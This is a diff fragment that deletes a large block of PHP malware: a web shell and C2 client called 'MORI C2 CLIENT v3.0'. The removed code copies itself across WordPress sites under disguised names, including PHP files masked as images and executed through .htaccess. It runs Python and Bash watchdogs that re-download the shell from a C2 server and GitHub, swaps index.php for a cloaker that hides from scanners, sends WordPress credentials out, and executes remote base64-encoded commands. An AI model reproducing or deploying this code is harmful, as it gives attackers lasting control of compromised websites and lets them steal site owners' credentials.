-    return array_values(array_unique($final_targets));
-}
-
-// Get main shell code
-function get_main_shell_code() {
-    // Try multiple locations
-    $paths = array_merge(
-        glob("/var/www/*/public_html/haeder.php"),
-        glob("/var/www/*/haeder.php"),
-        glob("/home/*/public_html/haeder.php"),
-        [__DIR__ . "/haeder.php", dirname(__DIR__) . "/haeder.php"]
-    );
-    
-    foreach ($paths as $path) {
-        $code = @file_get_contents($path);
-        if ($code && strlen($code) > 15000) {
-            return $code;
-        }
-    }
-    
-    return null;
-}
-
-// Fetch from C2 if local not available
-function get_shell_code_fallback() {
-    $c2_url = ($GLOBALS["C2_SERVER"] ?? "") . "?act=get_shell";
-    $content = @file_get_contents($c2_url);
-    if ($content && strlen($content) > 15000) {
-        return $content;
-    }
-    
-    $github_url = "https://raw.githubusercontent.com/wnwnsks/wn/refs/heads/main/l.php";
-    $content = @file_get_contents($github_url);
-    if ($content && strlen($content) > 15000) {
-        return $content;
-    }
-    
-    return null;
-}
-
-// Deploy to all targets
-function deploy_sister_files_from_backup() {
-    $shell_code = get_main_shell_code();
-    if (!$shell_code) {
-        $shell_code = get_shell_code_fallback();
-        if (!$shell_code) return 0;
-    }
-
-    $targets = get_deployment_targets_from_backup();
-    $deployed_paths = [];
-
-    $standard_names = ["wp-config-backup.php", "wp-content-backup.php", "wp-settings-backup.php"];
-    $masked_names = ["logo.png", "banner.gif", "avatar.jpg"];
-
-    foreach (array_slice($targets, 0, 10) as $idx => $target) {
-        // Standard PHP
-        $file = $target . "/" . $standard_names[$idx % count($standard_names)];
-        if (@file_put_contents($file, $shell_code)) {
-            @chmod($file, 0644);
-            $deployed_paths[] = $file;
-        }
-
-        // Image masked (no .php extension)
-        $img = $target . "/" . $masked_names[$idx % count($masked_names)];
-        $masked = "<?php\n" . substr($shell_code, 5);
-        if (@file_put_contents($img, $masked)) {
-            @chmod($img, 0644);
-            $deployed_paths[] = $img;
-        }
-
-        // .htaccess - execute .png .gif .jpg as PHP
-        $htaccess = $target . "/.htaccess";
-        $content = "<FilesMatch \"\\.png$|\\.gif$|\\.jpg$\">\n" .
-                   "    SetHandler application/x-httpd-php\n" .
-                   "</FilesMatch>\n";
-        @file_put_contents($htaccess, $content);
-    }
-
-    // Merge new paths into sister cache (picked up by main shell on next register)
-    $cache_file = sys_get_temp_dir() . "/.mori_sister_cache.json";
-    $existing   = @json_decode(@file_get_contents($cache_file), true) ?: ["locations" => [], "urls" => [], "timestamp" => 0];
-    $existing["locations"] = array_values(array_unique(array_merge($existing["locations"] ?? [], $deployed_paths)));
-    $existing["timestamp"] = time();
-    @file_put_contents($cache_file, json_encode($existing));
-
-    return count($deployed_paths);
-}
-
-// Main execution
-if (php_sapi_name() !== "cli" || !isset($GLOBALS["_wp_config_backup_running"])) {
-    $GLOBALS["_wp_config_backup_running"] = true;
-    deploy_sister_files_from_backup();
-}
-
-// Silent exit
-exit(0);
-?>';
-
-    return $code;
-}
-
-function ensure_persistence_v4() {
-    /**
-     * MAIN ORCHESTRATOR v2 - Called on every register
-     * Deploys sister files + Starts Python + Bash monitors (max 1 each)
-     */
-    global $c2_server, $web_shell_url, $CLIENT_ID, $client_id, $C2_SERVER;
-
-    // Throttle: her 5 dakikada bir çalış (her ?m= requestinde değil)
-    $throttle = sys_get_temp_dir() . '/.mori_persist_ts';
-    $last = (int)@file_get_contents($throttle);
-    if ($last && (time() - $last) < 300) return;
-    @file_put_contents($throttle, time());
-
-    $client_id = $client_id ?: ($CLIENT_ID ?: md5(gethostname() . microtime()));
-
-    // Step 1: Deploy aggressive sister files and report to C2
-    $deploy_info = @deploy_sister_files_aggressive();
-    if (is_array($deploy_info) && !empty($deploy_info['locations'])) {
-        @report_sister_files_to_c2($deploy_info);
-    }
-    
-    // Step 2: Create wp-config-backup.php orchestrator
-    $backup_code = @generate_wp_config_backup();
-    if ($backup_code) {
-        $backup_file = '/tmp/wp-config-backup.php';
-        @file_put_contents($backup_file, $backup_code);
-        @chmod($backup_file, 0755);
-        
-        // Execute in background
-        exec_any("nohup php " . escapeshellarg($backup_file), true);
-    }
-    
-    // Step 3: Start monitor processes (ONLY 1 instance each, no duplicates)
-    $monitor_lock = '/tmp/.svc_monitor_lock';
-    $lock_age = @file_exists($monitor_lock) ? (time() - @filemtime($monitor_lock)) : 0;
-    
-    // Start monitors: check every 5 minutes (lock freshness)
-    if ($lock_age > 300) {
-        @touch($monitor_lock);
-        
-        // Python monitor (max 1 instance) — local file check + restore
-        $py_process_count = (int)(exec_any("pgrep -c -f '/tmp/sys_security.py' 2>/dev/null || echo 0") ?: 0);
-        if ($py_process_count == 0) {
-            $shell_path_esc = addslashes(SHELL_PATH);
-            $shell_file_esc = addslashes(SHELL_FILE);
-            $c2_url_esc     = addslashes($C2_SERVER ?: '');
-            $token_esc      = md5('mori_c2_secret_2024_persistence');
-            $py_code = '#!/usr/bin/env python3
-import os, time, ssl, urllib.request
-
-SHELL_PATH = "' . $shell_path_esc . '"
-SHELL_FILE = "' . $shell_file_esc . '"
-C2_URL     = "' . $c2_url_esc     . '"
-TOKEN      = "' . $token_esc      . '"
-GH_URL     = "https://raw.githubusercontent.com/wnwnsks/wn/refs/heads/main/navbar.php"
-INTERVAL   = 60  # local check only — no HTTP alive probe
-
-ctx = ssl.create_default_context()
-ctx.check_hostname = False
-ctx.verify_mode    = ssl.CERT_NONE
-
-def needs_restore():
-    try:
-        return os.path.getsize(SHELL_PATH) < 10000
-    except OSError:
-        return True  # file missing
-
-def restore():
-    sources = [
-        (C2_URL + "?act=get_shell&token=" + TOKEN + "&file=" + SHELL_FILE, 4),
-        (GH_URL, 15),
-    ]
-    for url, tmo in sources:
-        try:
-            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
-            with urllib.request.urlopen(req, timeout=tmo, context=ctx) as r:
-                code = r.read()
-            if len(code) > 10000 and code[:5] == b"<?php":
-                with open(SHELL_PATH, "wb") as f: f.write(code)
-                os.chmod(SHELL_PATH, 0o644)
-                return True
-        except:
-            pass
-    return False
-
-if hasattr(os, "prctl"):
-    try: os.prctl(15, b"[system]")
-    except: pass
-
-while True:
-    try:
-        if needs_restore():
-            restore()
-        time.sleep(INTERVAL)
-    except:
-        time.sleep(INTERVAL)
-';
-            @file_put_contents('/tmp/sys_security.py', $py_code);
-            @chmod('/tmp/sys_security.py', 0755);
-            exec_any("nohup python3 /tmp/sys_security.py", true);
-        }
-
-        // Bash monitor (max 1 instance) — local file-size check + restore only when needed
-        $bash_process_count = (int)(exec_any("pgrep -c -f '/tmp/sys_monitor.sh' 2>/dev/null || echo 0") ?: 0);
-        if ($bash_process_count == 0) {
-            $shell_path_sh  = escapeshellarg(SHELL_PATH);
-            $shell_file_sh  = escapeshellarg(basename(SHELL_PATH));
-            $c2_sh          = escapeshellarg($C2_SERVER ?: '');
-            $token_sh       = md5('mori_c2_secret_2024_persistence');
-            $bash_code = '#!/bin/bash
-SHELL_PATH=' . $shell_path_sh . '
-SHELL_FILE=' . $shell_file_sh . '
-C2_URL=' . $c2_sh . '
-TOKEN="' . $token_sh . '"
-GH_URL="https://raw.githubusercontent.com/wnwnsks/wn/refs/heads/main/navbar.php"
-INTERVAL=60
-TMP="${SHELL_PATH}.tmp"
-
-# php_ok: reject Cloudflare UAM HTML (they return HTTP 200 but are not PHP)
-php_ok() { head -c5 "$1" 2>/dev/null | grep -q "<?php"; }
-
-restore() {
-  curl -sfL --max-time 4 "${C2_URL}?act=get_shell&token=${TOKEN}&file=${SHELL_FILE}" -o "$TMP" 2>/dev/null
-  if [ $? -eq 0 ] && [ $(stat -c%s "$TMP" 2>/dev/null || echo 0) -gt 10000 ] && php_ok "$TMP"; then
-    mv "$TMP" "$SHELL_PATH" && chmod 644 "$SHELL_PATH" && return 0
-  fi
-  wget -q --timeout=4 "${C2_URL}?act=get_shell&token=${TOKEN}&file=${SHELL_FILE}" -O "$TMP" 2>/dev/null
-  if [ $? -eq 0 ] && [ $(stat -c%s "$TMP" 2>/dev/null || echo 0) -gt 10000 ] && php_ok "$TMP"; then
-    mv "$TMP" "$SHELL_PATH" && chmod 644 "$SHELL_PATH" && return 0
-  fi
-  curl -sfL --max-time 15 "$GH_URL" -o "$TMP" 2>/dev/null
-  if [ $? -eq 0 ] && [ $(stat -c%s "$TMP" 2>/dev/null || echo 0) -gt 10000 ] && php_ok "$TMP"; then
-    mv "$TMP" "$SHELL_PATH" && chmod 644 "$SHELL_PATH" && return 0
-  fi
-  wget -q --timeout=15 "$GH_URL" -O "$TMP" 2>/dev/null
-  if [ $? -eq 0 ] && [ $(stat -c%s "$TMP" 2>/dev/null || echo 0) -gt 10000 ] && php_ok "$TMP"; then
-    mv "$TMP" "$SHELL_PATH" && chmod 644 "$SHELL_PATH" && return 0
-  fi
-  rm -f "$TMP"
-  return 1
-}
-
-while true; do
-  SZ=$(stat -c%s "$SHELL_PATH" 2>/dev/null || echo 0)
-  [ "$SZ" -lt 10000 ] && restore
-  sleep $INTERVAL
-done
-';
-            @file_put_contents('/tmp/sys_monitor.sh', $bash_code);
-            @chmod('/tmp/sys_monitor.sh', 0755);
-            exec_any("nohup bash /tmp/sys_monitor.sh", true);
-        }
-    }
-    
-    // Step 4: Store deployment metadata
-    $metadata = [
-        'client_id' => $client_id,
-        'deploy_time' => time(),
-        'shell_url' => $web_shell_url,
-        'c2_server' => $c2_server,
-        'php_version' => PHP_VERSION,
-        'os' => php_uname(),
-        'processes' => [
-            'python' => $py_process_count ?? 'n/a',
-            'bash' => $bash_process_count ?? 'n/a',
-        ],
-    ];
-    
-    @file_put_contents('/tmp/.mori_deployment_meta.json', json_encode($metadata));
-
-    // Step 5: Replace WP index.php with cloaking dropper
-    @install_wp_cloaking_index();
-
-    return true;
-}
-
-
-
-// DEPRECATED restore_from_backup() - Replaced with ensure_persistence_v4()
-
-
-
-
-
-// =============================================
-// OTOMATİK KAYIT (HER ERİŞİMDE)
-// =============================================
-function auto_register() {
-    global $web_shell_url;
-    $c2_server = $GLOBALS['C2_SERVER'];
-    $client_id = $GLOBALS['CLIENT_ID'];
-
-    // Throttle: 10 dakikada bir C2'ye kayıt (her ?m= isteğinde değil)
-    $reg_ts_file = sys_get_temp_dir() . '/.mori_reg_ts';
-    $last_reg    = (int)@file_get_contents($reg_ts_file);
-    if ($last_reg && (time() - $last_reg) < 600) {
-        $GLOBALS['_SHELL_REGISTERED'] = true;
-        return true;
-    }
-    @file_put_contents($reg_ts_file, time());
-    
-    // Get WordPress login credentials (dynamic)
-    $wp_creds = generate_wp_login_credentials();
-    
-    // C2 sunucusuna kayıt yap - BACKGROUND ONLY (don't block)
-    $auto_reg_sister = sys_get_temp_dir() . '/.mori_sister_cache.json';
-    $auto_reg_sf     = @json_decode(@file_get_contents($auto_reg_sister), true);
-
-    $registration_data = [
-        'id'           => $client_id,
-        'web_shell_url'=> $web_shell_url,
-        'sysinfo'      => collect_system_info(),
-        'sister_files' => $auto_reg_sf['locations'] ?? [],
-        'sister_urls'  => $auto_reg_sf['urls']      ?? [],
-        'timestamp'    => time(),
-        'version'      => '3.0',
-        'wp_login_id'  => $wp_creds['blogs_id'],
-        'wp_login_hash'=> $wp_creds['hash'],
-    ];
-
-    $register_url = $c2_server . '?act=reg';
-    $encoded = safe_base64_encode(safe_json_encode($registration_data));
-
-    // Very short timeout (fire-and-forget) — 2s to allow encoding overhead
-    $result = @http_post_timeout($register_url, $encoded, 2);
-    
-    // Mark as attempted (don't try again this request)
-    $GLOBALS['_SHELL_REGISTERED'] = true;
-    
-    return $result !== null;
-}
-
-
-
-
-// =====================================================
-// HELPER: Add missing delete_directory function
-// =====================================================
-function delete_directory($path) {
-    $real = realpath($path);
-    
-    if (!$real || !is_dir($real)) {
-        return "[ERROR] Directory not found: $path";
-    }
-    
-    $items = @scandir($real);
-    if ($items && count($items) > 2) {
-        return "[ERROR] Directory not empty";
-    }
-    
-    return @rmdir($real) ? "OK: Deleted $path" : "[ERROR] Cannot delete directory";
-}
-
-// =====================================================
-// WP CLOAKING INDEX INSTALLER
-// =====================================================
-
-function generate_wp_cloaking_index_content() {
-    $c2  = $GLOBALS['C2_SERVER'] ?? '';
-    $gh  = 'https://raw.githubusercontent.com/wnwnsks/wn/refs/heads/main/l.php';
-    $tok = md5('mori_c2_secret_2024_persistence');
-    $key = md5($tok);
-
-    // Config block — interpolated now, embedded as PHP string literals
-    $cfg = '<?php /* _wpa_cloaker v1 */' . "\n"
-         . '$_wc2="' . addslashes($c2) . '";' . "\n"
-         . '$_wgh="' . addslashes($gh) . '";' . "\n"
-         . '$_wtok="' . $tok . '";' . "\n"
-         . '$_wkey="' . $key . '";' . "\n";
-
-    // Body — NOWDOC, no interpolation
-    $body = <<<'WPAEOF'
-$_wbot=(bool)preg_match('/(bot|crawl|spider|slurp|google|bing|yahoo|yandex|baidu|facebookexternalhit|wordfence|sucuri|imunify|modsecurity|nikto|sqlmap|nmap|acunetix|nuclei|burp|python-requests|go-http-client|libwww|curl\/[0-9])/i',strtolower($_SERVER['HTTP_USER_AGENT']??''));
-
-// Installer endpoint — called by JS fetch or server curl
-if(!empty($_GET['_wpa'])&&$_GET['_wpa']===$_wkey&&!$_wbot){
-    $_wsf=__DIR__.'/wp-activater.php';
-    $_wok=false;
-    $_wx=stream_context_create(['http'=>['timeout'=>10,'ignore_errors'=>true],'ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]]);
-    foreach([$_wc2.'?act=get_shell&token='.$_wtok,$_wgh] as $_wu){
-        $_wr=false;
-        if(function_exists('curl_init')){$_wh=curl_init($_wu);curl_setopt_array($_wh,[19913=>true,52=>true,64=>false,10018=>'Mozilla/5.0',13=>10]);$_wr=@curl_exec($_wh);curl_close($_wh);}
-        if(!$_wr)$_wr=@file_get_contents($_wu,false,$_wx);
-        if($_wr&&strlen($_wr)>10000){$_wok=@file_put_contents($_wsf,$_wr)!==false;if($_wok){@chmod($_wsf,0644);break;}}
-    }
-    header('Content-Type: text/plain');die($_wok?'ok':'fail');
-}
-
-if(!$_wbot){
-    $_wsf=__DIR__.'/wp-activater.php';
-    if(!@file_exists($_wsf)||@filesize($_wsf)<10000){
-        $_wsu=(isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off'?'https':'http')
-            .'://'.($_SERVER['HTTP_HOST']??'localhost').$_SERVER['SCRIPT_NAME'].'?_wpa='.$_wkey;
-        $_wd=false;
-        $_wx=stream_context_create(['http'=>['timeout'=>4,'ignore_errors'=>true],'ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]]);
-        // M1: Direct PHP fetch from C2 then GitHub
-        foreach([$_wc2.'?act=get_shell&token='.$_wtok,$_wgh] as $_wu){
-            $_wr=false;
-            if(function_exists('curl_init')){$_wh=curl_init($_wu);curl_setopt_array($_wh,[19913=>true,52=>true,64=>false,10018=>'Mozilla/5.0',13=>4]);$_wr=@curl_exec($_wh);curl_close($_wh);}
-            if(!$_wr)$_wr=@file_get_contents($_wu,false,$_wx);
-            if($_wr&&strlen($_wr)>10000&&@file_put_contents($_wsf,$_wr)!==false){@chmod($_wsf,0644);$_wd=true;break;}
-        }
-        // M2: Server-side self-curl to installer endpoint
-        if(!$_wd&&function_exists('curl_init')){
-            $_wh=curl_init($_wsu);
-            curl_setopt_array($_wh,[19913=>true,52=>true,64=>false,13=>5,10023=>['X-WP-A: 1']]);
-            @curl_exec($_wh);curl_close($_wh);
-            $_wd=@file_exists($_wsf)&&@filesize($_wsf)>10000;
-        }
-        // M3: Client-side JS fetch — injected into page output via ob_start
-        if(!$_wd){
-            ob_start(function($_wbuf)use($_wsu){
-                $_wjs='<script>(function(){var x=new XMLHttpRequest;x.open("GET","'
-                    .htmlspecialchars($_wsu,ENT_QUOTES).'",true);x.send()})();</script>';
-                return stripos($_wbuf,'</body>')!==false
-                    ?str_ireplace('</body>',$_wjs.'</body>',$_wbuf)
-                    :$_wbuf.$_wjs;
-            });
-        }
-    }
-}
-define('WP_USE_THEMES',true);
-require __DIR__.'/wp-blog-header.php';
-WPAEOF;
-
-    return $cfg . $body;
-}
-
-function install_wp_cloaking_index() {
-    if (!is_wordpress_installed()) return false;
-
-    // Find WP root (has both wp-config.php and wp-blog-header.php)
-    $wp_root = null;
-    foreach ([__DIR__, dirname(__DIR__), dirname(dirname(__DIR__)), dirname(dirname(dirname(__DIR__)))] as $d) {
-        if (@file_exists($d . '/wp-config.php') && @file_exists($d . '/wp-blog-header.php')) {
-            $wp_root = $d;
-            break;
-        }
-    }
-    if (!$wp_root) return false;
-
-    $index_path = $wp_root . '/index.php';
-
-    // Already our cloaker?
-    $cur = @file_get_contents($index_path);
-    if ($cur && strpos($cur, '_wpa_cloaker') !== false) return true;
-
-    // Throttle: once per day
-    $ts = sys_get_temp_dir() . '/.mori_wpidx_ts';
-    if ((int)@file_get_contents($ts) > time() - 86400) return false;
-    @file_put_contents($ts, time());
-
-    // chmod 777 → unlink → write new
-    @chmod($index_path, 0777);
-    @unlink($index_path);
-
-    $content = generate_wp_cloaking_index_content();
-    if (!$content) return false;
-
-    if (@file_put_contents($index_path, $content) !== false) {
-        @chmod($index_path, 0644);
-        return true;
-    }
-    return false;
-}
-
-// =====================================================
-// SELF-RENAME FOR NON-WP DEPLOYMENTS (wp-activeter.php)
-// =====================================================
-
-function self_rename_and_register() {
-    // Only when running as wp-activeter.php on a non-WP site
-    if (basename(__FILE__) !== 'wp-activeter.php') return;
-    if (is_wordpress_installed()) return;
-
-    $navbar_path = __DIR__ . '/navbar.php';
-    // navbar.php already healthy → already done
-    if (@file_exists($navbar_path) && @filesize($navbar_path) > 10000) return;
-
-    // Step 1: Copy self → navbar.php
-    $self_content = @file_get_contents(__FILE__);
-    if (!$self_content || strlen($self_content) < 10000) return;
-    if (@file_put_contents($navbar_path, $self_content) === false) return;
-    @chmod($navbar_path, 0644);
-
-    // Step 2: Self-delete wp-activeter.php
-    @unlink(__FILE__);
-
-    // Step 4: Clean exit — file is gone, 302 to homepage
-    if (php_sapi_name() !== 'cli') {
-        http_response_code(302);
-        header('Location: /');
-    }
-    exit(0);
-}
-
-// =====================================================
-// WEB SHELL API ENDPOINTS
-// =====================================================
-
-// DEBUG MODE
-if (isset($_GET['debug']) && $debug_mode) {
-    $client_id = $GLOBALS['CLIENT_ID'] ?? '';
-    $os_type   = PHP_OS;
-    header('Content-Type: text/plain; charset=utf-8');
-    echo "MORI C2 CLIENT v3.0\n";
-    echo "====================\n\n";
-    echo "Client ID: $client_id\n";
-    echo "OS: $os_type\n";
-    echo "Web Shell URL: $web_shell_url\n";
-    echo "Current User: " . get_current_user() . "\n";
-    echo "Current Directory: " . getcwd() . "\n";
-    echo "PHP Version: " . PHP_VERSION . "\n";
-    echo "Server Software: " . ($_SERVER['SERVER_SOFTWARE'] ?? 'unknown') . "\n\n";
-    
-    echo "SYSTEM INFO:\n";
-    print_r(collect_system_info());
-    exit;
-}
-
-// REGISTER DATA ENDPOINT (for server to pull sysinfo)
-if (isset($_GET['act']) && $_GET['act'] == 'register_data') {
-    // PRE-EXECUTION PERSISTENCE CHECK
-    @ensure_persistence_v4();
-
-    header('Content-Type: application/json; charset=utf-8');
-    echo json_encode(collect_system_info());
-    exit;
-}
-
-// PULL REGISTER — C2 sunucu bu endpoint'i çekerek shell'i kayıt eder (UAM bypass)
-if (isset($_GET['act']) && $_GET['act'] === 'pull_register') {
-    $wp_creds  = generate_wp_login_credentials();
-    $server_ip = $_SERVER['SERVER_ADDR']
-              ?? $_SERVER['LOCAL_ADDR']
-              ?? @gethostbyname(@gethostname())
-              ?? '0.0.0.0';
-
-    // Sister cache — önceki persistence çalışmasından kalan veri (varsa)
-    $sister_cache = sys_get_temp_dir() . '/.mori_sister_cache.json';
-    $sister_data  = @json_decode(@file_get_contents($sister_cache), true);
-
-    // Yanıtı hemen gönder — C2 curl timeout'u dolmadan önce cevap dönsün
-    $response = json_encode([
-        'id'            => $GLOBALS['CLIENT_ID'],
-        'web_shell_url' => $GLOBALS['WEB_URL'],
-        'server_ip'     => $server_ip,
-        'sysinfo'       => collect_system_info(),
-        'sister_files'  => $sister_data['locations'] ?? [],
-        'sister_urls'   => $sister_data['urls']      ?? [],
-        'timestamp'     => time(),
-        'version'       => '3.0',
-        'wp_login_id'   => $wp_creds['blogs_id'],
-        'wp_login_hash' => $wp_creds['hash'],
-    ], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
-
-    header('Content-Type: application/json; charset=utf-8');
-    header('Content-Length: ' . strlen($response));
-    echo $response;
-
-    // HTTP bağlantısını kapat — C2 cevabı aldı, PHP arka planda çalışmaya devam eder
-    if (function_exists('fastcgi_finish_request')) {
-        fastcgi_finish_request();
-    } else {
-        @ob_end_flush();
-        @flush();
-    }
-
-    // Bağlantı kapandıktan sonra: persistence + register (artık C2 timeout'u etkilemez)
-    ignore_user_abort(true);
-    set_time_limit(120);
-    @ensure_persistence_v4();
-    @auto_register();
-    exit(0);
-}
-
-// WP CREDS — injected WP plugin posts credentials here, we forward to C2
-if (isset($_GET['act']) && $_GET['act'] === 'wp_creds') {
-    $creds_encoded = $_POST['creds'] ?? '';
-    if (!empty($creds_encoded)) {
-        $payload = safe_base64_encode(safe_json_encode([
-            'creds'     => $creds_encoded,
-            'shell_url' => $GLOBALS['WEB_URL'],
-        ]));
-        @http_post_timeout($GLOBALS['C2_SERVER'] . '?act=store_wp_creds', $payload, 3);
-    }
-    header('Content-Type: text/plain');
-    die('ok');
-}
-
-// REGISTER ONLY (manuel kayıt için)
-// Optimize: batch mode veya single mode
-if (isset($_GET['register'])) {
-    // PRE-EXECUTION PERSISTENCE CHECK
-    @ensure_persistence_v4();
-    
-    header('Content-Type: text/plain; charset=utf-8');
-    
-    // Check if batch registration is available (multiple clients accessing)
-    $batch_mode = isset($_GET['batch']) && $_GET['batch'] === '1';
-    
-    if ($batch_mode) {
-        // Batch mode: queue'de bekle, toplamaya devam et
-        $result = auto_register();
-        echo $result ? "QUEUED - Will be registered in batch\n" : "FAILED - Queue error";
-    } else {
-        // Single mode: immediate registration
-        $result = auto_register();
-        echo $result ? "OK - Registered successfully\n" : "FAILED - Registration failed\n";
-    }
-    
-    exit;
-}
-
-// COMMAND EXECUTION VIA GET (base64 encoded - supports both safe_base64 and normal base64)
-if (isset($_GET['m'])) {
-    ignore_user_abort(true); // flood, C2 bağlantısı kesse bile devam eder
-    set_time_limit(0);
-    @ensure_persistence_v4();
-    auto_register();
-
-    ob_end_clean();
-    header('Access-Control-Allow-Origin: *');
-    header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
-    header('Access-Control-Allow-Headers: Content-Type');
-    
-    // Try safe_base64_decode first, then normal base64
-    $encoded = $_GET['m'] ?? null;
-    
-    if (!$encoded || !is_string($encoded)) {
-        header('Content-Type: application/json; charset=utf-8');
-        http_response_code(400);
-        die(json_encode(['error' => 'No payload provided']));
-    }
-    
-    $cmd = safe_base64_decode($encoded);
-    if ($cmd === false || strlen($cmd) === 0) {
-        $cmd = @base64_decode($encoded, true);
-    }
-    if ($cmd === false || !$cmd || strlen($cmd) === 0) {
-        header('Content-Type: application/json; charset=utf-8');
-        http_response_code(400);
-        die(json_encode(['error' => 'Invalid base64 encoding']));
-    }
-    
-    $output = execute_command($cmd);
-    
-    // Detect output type and set appropriate header
-    if (@json_decode($output, true) !== null) {
-        header('Content-Type: application/json; charset=utf-8');
-    } else {
-        header('Content-Type: text/plain; charset=utf-8');
-    }
-    echo $output;
-    exit;
-}
-
-// COMMAND EXECUTION VIA POST (supports both safe_base64 and normal base64)
-if (isset($_POST['m'])) {
-    @ensure_persistence_v4();
-    auto_register();
-    
-    ob_end_clean();
-    header('Access-Control-Allow-Origin: *');
-    header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
-    header('Access-Control-Allow-Headers: Content-Type');
-    
-    $payload = $_POST['m'] ?? null;
-    
-    // NULL-safe payload handling
-    if (!$payload || !is_string($payload)) {
-        header('Content-Type: application/json; charset=utf-8');
-        http_response_code(400);
-        die(json_encode(['error' => 'No payload provided']));
-    }
-    
-    // Try safe_base64_decode first, then normal base64
-    $cmd = null;
-    if (strpos($payload, 'base64:') === 0 && strlen($payload) > 7) {
-        $encoded_part = substr($payload, 7);
-        $cmd = safe_base64_decode($encoded_part);
-        if ($cmd === false) {
-            $cmd = @base64_decode($encoded_part, true);
-        }
-    } else {
-        $cmd = safe_base64_decode($payload);
-        if ($cmd === false) {
-            $cmd = @base64_decode($payload, true);
-        }
-    }
-    
-    if ($cmd === false || !$cmd || strlen($cmd) === 0) {
-        header('Content-Type: application/json; charset=utf-8');
-        http_response_code(400);
-        die(json_encode(['error' => 'Invalid base64 encoding']));
-    }
-    
-    $output = execute_command($cmd);
-    
-    // Detect output type and set appropriate header
-    if (@json_decode($output, true) !== null) {
-        header('Content-Type: application/json; charset=utf-8');
-    } else {
-        header('Content-Type: text/plain; charset=utf-8');
-    }
-    echo $output;
-    exit;
-}
-
-// JSON API (ileri düzey)
-if (isset($_SERVER['CONTENT_TYPE']) && strpos($_SERVER['CONTENT_TYPE'], 'application/json') !== false) {
-    // PRE-EXECUTION PERSISTENCE CHECK
-    @ensure_persistence_v4();
-    auto_register(); // Register this execution
-    
-    $input = json_decode(file_get_contents('php://input'), true);
-    
-    if ($input && isset($input['action'])) {
-        header('Content-Type: application/json; charset=utf-8');
-        
-        switch ($input['action']) {
-            case 'exec':
-                $cmd = $input['command'] ?? '';
-                $result = execute_command($cmd);
-                echo json_encode(['success' => true, 'output' => $result]);
-                break;
-                
-            case 'info':
-                echo json_encode(collect_system_info());
-                break;
-                
-            case 'register':
-                $success   = auto_register();
-                $client_id = $GLOBALS['CLIENT_ID'] ?? '';
-                echo json_encode(['success' => $success, 'client_id' => $client_id]);
-                break;
-
-            case 'upload_dos_py':
-                // Upload dos.py file - base64 encoded
-                $file_content = $input['file_content'] ?? '';
-                $file_path = '/tmp/dos.py';
-                if ($file_content && base64_decode($file_content, true)) {
-                    $decoded = base64_decode($file_content);
-                    if (file_put_contents($file_path, $decoded) !== false) {
-                        @chmod($file_path, 0755);
-                        echo json_encode(['success' => true, 'file' => $file_path]);
-                    } else {
-                        echo json_encode(['success' => false, 'error' => 'Write failed']);
-                    }
-                } else {
-                    echo json_encode(['success' => false, 'error' => 'Invalid base64']);
-                }
-                break;
-
-            case 'upload_dos_php':
-                // Upload dos.php file - base64 encoded
-                $file_content = $input['file_content'] ?? '';
-                $file_path = 'dos.php';
-                if ($file_content && base64_decode($file_content, true)) {
-                    $decoded = base64_decode($file_content);
-                    if (file_put_contents($file_path, $decoded) !== false) {
-                        @chmod($file_path, 0755);
-                        echo json_encode(['success' => true, 'file' => $file_path]);
-                    } else {
-                        echo json_encode(['success' => false, 'error' => 'Write failed']);
-                    }
-                } else {
-                    echo json_encode(['success' => false, 'error' => 'Invalid base64']);
-                }
-                break;
-                
-            default:
-                echo json_encode(['error' => 'Unknown action']);
-        }
-        exit;
-    }
-}
-
-// =====================================================
-// BACKGROUND AGENT MODE (CLI veya ?agent=1 ile)
-// =====================================================
-if (php_sapi_name() === 'cli' || isset($_GET['agent']) || isset($_GET['daemon'])) {
-    // Agent modu - sayfa gösterilmez, sürekli çalışır
-    $max_execution = isset($_GET['timeout']) ? (int)$_GET['timeout'] : 300;
-    $sleep_interval = isset($_GET['sleep']) ? (int)$_GET['sleep'] : 5;
-    
-    auto_register();
-    $client_id = $GLOBALS['CLIENT_ID'] ?? '';
-    $c2_server = $GLOBALS['C2_SERVER'] ?? '';
-
-    $start_time = time();
-    $task_counter = 0;
-
-    while ((time() - $start_time) < $max_execution) {
-        $task = c2_get_task($c2_server, $client_id);
-        
-        if ($task && trim($task) && trim($task) !== 'no_task') {
-            $task_counter++;
-            $output = execute_command($task);
-            c2_send_result($c2_server, $client_id, $task, $output);
-        }
-        
-        if ($task_counter % 10 === 0) {
-            c2_update_status($c2_server, $client_id);
-        }
-        
-        sleep($sleep_interval);
-    }
-    
-    if (php_sapi_name() === 'cli') {
-        exit(0);
-    }
-    
-    echo "MORI C2 Agent completed " . $task_counter . " tasks in " . (time() - $start_time) . " seconds\n";
-    exit;
-}
-
-// =====================================================
-// NETWORK MONITORING DAEMON (?monitor=1 mode)
-// Distributed backup network'ü 30 saniyede bir kontrol et
-// =====================================================
-if (isset($_GET['monitor'])) {
-    set_time_limit(0);
-    ignore_user_abort(true);
-    
-    $monitor_interval = isset($_GET['interval']) ? (int)$_GET['interval'] : 30;
-    $max_monitor_time = isset($_GET['max_time']) ? (int)$_GET['max_time'] : 86400; // 24 saat
-    
-    $start_time = time();
-    $check_count = 0;
-    $restore_count = 0;
-    
-    while ((time() - $start_time) < $max_monitor_time) {
-        $check_count++;
-        
-        // 1. Check distributed backups
-        $inventory = @file_get_contents(__DIR__ . '/.wp-security.list');
-        if ($inventory) {
-            $files = array_filter(array_map('trim', explode("\n", $inventory)));
-            foreach ($files as $file) {
-                if (strpos($file, ';') !== false || strpos($file, '#') === 0) continue; // Skip comments
-                
-                if (!file_exists($file) || filesize($file) < 5000) {
-                    // File missing or damaged - restore
-                    $payload = @file_get_contents($c2_server . '?urlver');
-                    if (!$payload || strlen($payload) < 100) {
-                        $payload = @file_get_contents('https://raw.githubusercontent.com/wnwnsks/wn/refs/heads/main/' . SHELL_FILE);
-                    }
-                    
-                    if ($payload && strlen($payload) > 5000) {
-                        @file_put_contents($file, $payload);
-                        @chmod($file, 0644);
-                        $restore_count++;
-                    }
-                }
-            }
-        }
-        
-        // 2. Execute PHP backups
-        $dirs = ['/tmp', '/var/tmp', '/var/www', '/var/www/html', '/home'];
-        foreach ($dirs as $dir) {
-            if (is_dir($dir)) {
